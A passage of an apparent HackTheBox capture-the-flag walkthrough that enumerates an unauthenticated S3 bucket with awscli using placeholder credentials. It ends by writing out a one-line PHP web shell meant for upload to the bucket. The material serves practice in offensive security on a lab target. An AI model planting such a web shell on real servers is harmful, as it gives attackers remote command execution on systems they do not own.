
Since the subdomain is s3, the `awscli` tool could likely be used to explore further.

### Installing
```
┌──(kali㉿kali)-[~]
└─$ sudo apt install awscli
The following packages were automatically installed and are no longer required:
  containerd                    libsort-naturally-perl
  criu                          needrestart
  docker-buildx                 pipewire-module-xrdp
  docker-cli                    python3-packaging-whl
  libcompel1                    python3-pycriu
  libintl-perl                  python3-pyinstaller-hooks-contrib
  libintl-xs-perl               python3-wheel-whl
  libmodule-find-perl           runc
  libpipewire-0.3-modules-xrdp  tini
  libproc-processtable-perl
Use 'sudo apt autoremove' to remove them.

Installing:
  awscli
                                                                             
Installing dependencies:
  docutils-common  python3-docutils  python3-roman
  python3-awscrt   python3-jmespath                                          
<SNIP>
                                                                             
┌──(kali㉿kali)-[~]
└─$ aws configure                                
AWS Access Key ID [None]: foo
AWS Secret Access Key [None]: foo
Default region name [None]: foo
Default output format [None]: foo

                              
```

Since any credentials/keys are unknown, they will stay set as placeholder values for now.

### Listing bucket contents
```
┌──(kali㉿kali)-[~]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2025-08-11 06:08:39 thetoppers.htb
                                                                             
┌──(kali㉿kali)-[~]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2025-08-11 06:08:39          0 .htaccess
2025-08-11 06:08:39      11952 index.php

```

### Creating and uploading a webshell
https://github.com/cspshivam/webshells
```
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Three]
└─$ cat ignore.php                                   
<?php system($_GET['cmd']); ?>

```